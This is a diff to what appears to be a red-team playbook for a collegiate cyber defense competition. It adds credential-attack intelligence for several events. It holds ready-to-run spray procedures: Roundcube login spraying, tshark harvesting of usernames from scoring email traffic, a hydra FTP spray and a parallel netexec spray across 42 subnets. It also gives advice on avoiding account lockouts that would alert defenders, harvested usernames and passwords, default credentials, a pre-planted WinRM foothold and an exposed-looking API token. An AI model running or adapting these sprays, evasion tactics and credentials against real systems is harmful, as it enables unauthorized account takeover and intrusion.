@@ -57,10 +57,76 @@ The SSH spray window closes at approximately T+3min against the AI blue team (T+
 Three new services confirmed in inv5 that accept credential attacks. These should be sprayed simultaneously with the quals targets at T=0 if the inv5 layout is detected.
 
 1. Roundcube Webmail (moomail.[domain] on .86 hosts, port 80):
-   Login endpoint: POST /?_task=login
-   Fields: _user=[username]&_pass=[password]&_timezone=[tz]&_task=login&_action=login
-   Observed spray: pyoung/admin, pyoung/password, pyoung/root
-   Try: admin/admin, admin/password, admin/changeme, [scenario-usernames]/[theme-word]
+   Login endpoint: POST http://10.100.XXX.86/?_task=login
+   Content-Type: application/x-www-form-urlencoded
+   Full field format: _token=[CSRF]&_task=login&_action=login&_timezone=America%2FLos_Angeles&_url=&_user=[USERNAME]&_pass=[PASSWORD]
+
+   CSRF token: obtain first via GET / — token is embedded in page source as <input name="_token" value="...">
+
+   Observed spray sequence (inv5):
+     pyoung / admin
+     pyoung / password
+     pyoung / root
+
+   Complete spray list for Roundcube:
+     1. [SMTP-harvested usernames] / admin          (pyoung, ajohnson, gwilliams, rking, dlee)
+     2. [SMTP-harvested usernames] / password
+     3. [SMTP-harvested usernames] / [theme-word]   (e.g., udderstrength, moomoo, dairy)
+     4. admin / admin
+     5. admin / password
+     6. admin / changeme
+
+   Username source: harvest from SMTP scoring traffic at T=0 (see SMTP Username Oracle below)
+   Timing: spray within first 60-90 seconds before HTTP firewall deployment
+   Noise: LOW — single HTTP POST per attempt; looks like normal login traffic
+
+### SMTP Scoring Traffic as Passive Username Oracle (confirmed in 2026-inv5)
+
+At competition start, scoring engines send SMTP test emails to team mail servers (.86 hosts in inv5). These emails contain real username@domain addresses in MAIL FROM and RCPT TO fields in cleartext. Capture these passively before spraying to confirm valid accounts at zero cost.
+
+Passive harvest command (run at T=0 while scoring traffic flows):
+  tshark -i eth0 -Y "smtp.req.parameter" -T fields -e smtp.req.command -e smtp.req.parameter -a duration:30
+
+Or from a PCAP:
+  tshark -r <pcap> -Y "smtp.req.parameter" -T fields -e smtp.req.command -e smtp.req.parameter
+
+inv5 usernames confirmed via SMTP (udderstrength.gym):
+  ajohnson, pyoung, gwilliams, rking, dlee, ceo, moomail, wp-admin
+
+Username format: lowercase first-initial+lastname (consistent with inv2 format; differs from quals FIRSTNAME_LASTNAME)
+
+These harvested usernames are valid for:
+  - Roundcube webmail spray on .86 (same domain)
+  - AD/LDAP enumeration on DC (same domain — COWBUNTU)
+  - SSH username guessing on Linux hosts
+  - Any service using domain credentials
+
+This technique is universally applicable: any WRCCDC event with a mail server will have scoring engines sending test emails with valid usernames at T=0.
+
+### Scoring-Critical Account Exclusion List (confirmed in 2026-inv5)
+
+The following accounts are used by scoring engines for continuous service verification. Locking these accounts (via failed authentication attempts exceeding the lockout threshold) breaks scoring, which alerts the blue team to the spray without providing any operational gain.
+
+DO NOT spray aggressively against these accounts:
+
+inv5 scoring accounts:
+  moomoo  — NTLM authentication to .98 Windows hosts every 60-90 seconds (scoring engine IPs: 10.194.163.224, 10.208.104.225, 10.253.245.56)
+  ceo     — NTLM authentication to .98 Windows hosts (same scoring engines as moomoo; domain: COWBUNTU)
+  ajohnson — SMTP RCPT TO target on .86 Roundcube hosts (mail delivery scoring check)
+
+inv2 scoring accounts:
+  Graylog API token (not a user account, but: 12afjthotgefe01fv714tec0ag9qeuf3qup9a36bcecicbo11fj0 must not be rotated)
+
+General rule: before spraying any target, observe scoring engine traffic for 30-60 seconds to identify which accounts are used for scoring checks. These accounts should be:
+  - Sprayed with at most 1-2 high-confidence passwords (not brute-forced)
+  - Never targeted with lockout-inducing spray volumes
+  - Monitored post-spray: if the account stops appearing in scoring traffic, it has been locked and blue team will notice
+
+Detection via scoring observation:
+  tshark -i eth0 -Y "ntlmssp.auth.username" -T fields -e ntlmssp.auth.username -e ip.src -a duration:60
+  (shows which accounts are being used for NTLM authentication and from which scoring engine IPs)
+
+Any account appearing from 3+ distinct source IPs with regular intervals is almost certainly a scoring account — exclude it from aggressive spray campaigns.
 
 2. Splunk SIEM (Work1.[domain] on .60 hosts, port 8000):
    Login: POST /en-US/account/login or direct web form
@@ -176,6 +242,76 @@ Attack paths for Gitea (priority order):
   6. Secret enumeration: admin can view all repository secrets and environment variables
 
 Note: Gitea v1.21.1 — check for CVEs in this version range for unauthenticated RCE before competition day.
+
+### 2026-inv3 Credential Intelligence (MindMend theme, observed 2025-11-15)
+
+Competition domain: MINDMEND / mindmend.ai (mental health / neuroscience theme)
+DC hostname: CORTEX (machine account: CORTEX$)
+
+Universal FTP password (all users, all 32 teams): FixTheBrain123!
+  FTP target: 10.100.XXX.103 port 21
+
+Confirmed FTP usernames (spray all with FixTheBrain123!):
+  dgonzalez, ajohnson, anguyen, kliu, achi, ATHENA, jsmith
+
+WinRM pre-staged access (active at T+9 seconds):
+  Target: 10.100.XXX.97 port 5985
+  Credential: kliu@MINDMEND
+  This was pre-planted before competition start — provides dwell time independent of firewall response
+
+MySQL scoring query (on .103:3306):
+  SELECT age FROM scoring.person
+  Database: scoring; Table: person; Column: age
+  If MySQL access is obtained, this query structure reveals the scoring schema
+
+Cross-Competition Universal Password Pattern (all 2026 events):
+  quals (Feb 2026):  WaterIsWet??      — hydration theme
+  inv2 (Nov 2025):   OMGaTREX1?        — dinosaur theme (used as replacement password by arexford)
+  inv3 (Nov 2025):   FixTheBrain123!   — mental health theme
+  inv5 (Dec 2025):   [dairy-themed]    — not yet confirmed in cleartext
+  inv6 (Jan 2026):   [Star Wars chars] — per-account unique passwords (different pattern)
+
+Pattern: each competition uses a single thematic password for initial deployment, except inv6 which used per-account unique passwords. At Regionals, generate password candidates matching the announced theme: [ThemeWord][Verb][Special] or [ThemeVerb][ThemeNoun][Digits][Special].
+
+FTP spray command (inv3 layout):
+  hydra -L /tmp/inv3-users.txt -p 'FixTheBrain123!' ftp://10.100.1XX.103 -t 4 -f
+  (where /tmp/inv3-users.txt contains: dgonzalez, ajohnson, anguyen, kliu, achi, ATHENA, jsmith)
+
+### 2026-inv4 Credential Intelligence (auto.auto — Automotive Theme, observed 2025-12-06)
+
+Competition domain: auto.auto (NetBIOS: AUTO)
+DC hostname: JEEP (SPN: jeep.auto.auto; machine account: JEEP$)
+
+WordPress scored user: supra (Toyota Supra — automotive theme)
+  Target: 10.100.XXX.63 port 80
+  Spray: supra/[automotive-themed-password], admin/admin, admin/password
+
+Automotive-themed password candidates (based on cross-competition pattern):
+  DriveTheCar??    RevTheEngine1!    AutoShop2025!
+  ShiftGears123!   TurnTheKey??      ParkTheCar1?
+  FuelTheRace!!    HitTheGas123!     StartTheEngine??
+
+Note: no plaintext password was captured in inv4 PCAPs (all HTTP was scored, no cleartext FTP observed). The candidates above are generated from the [ThemeVerb][ThemeNoun][Digits][Special] pattern confirmed across quals/inv2/inv3. Spray these first, then fall back to generic CCDC defaults.
+
+MinIO default credentials (on .2 hosts):
+  API (port 9000): minioadmin / minioadmin (MinIO factory default)
+  Console (port 9001): minioadmin / minioadmin
+  Test: curl -s http://10.100.XXX.2:9000/minio/health/live
+  Note: MinIO FTP on port 21 returns 500 to all commands — do NOT waste time on FTP; use the HTTP API
+
+Wazuh default credentials (on .240 hosts):
+  API: wazuh / wazuh (factory default for API authentication)
+  Dashboard: admin / admin (factory default for web console)
+  WARNING: Wazuh has live CTI from cti.wazuh.com — known malicious IPs/signatures are actively blocked
+
+WinRM target priority (inv4 layout):
+  1. 10.100.XXX.25:5985 — DC (JEEP); try Administrator/[theme-password], Administrator/Password1!
+  2. 10.100.XXX.60:22 — Linux; try root/[theme-password], admin/admin
+  3. 10.100.XXX.63:80 — WordPress; try supra/[theme-password], admin/admin
+  4. 10.100.XXX.88:80 — Web app; try admin/admin, admin/password
+
+42-team scale note: with 42 teams, sequential spray takes >10 minutes. Use parallel hydra/netexec with GNU parallel or xargs to cover all subnets within the 60-90 second window:
+  seq 101 142 | xargs -P 42 -I{} netexec smb 10.100.{}.25 -u Administrator -p 'DriveTheCar??' --no-bruteforce
 
 ## Quick-Win Service Exploits
 
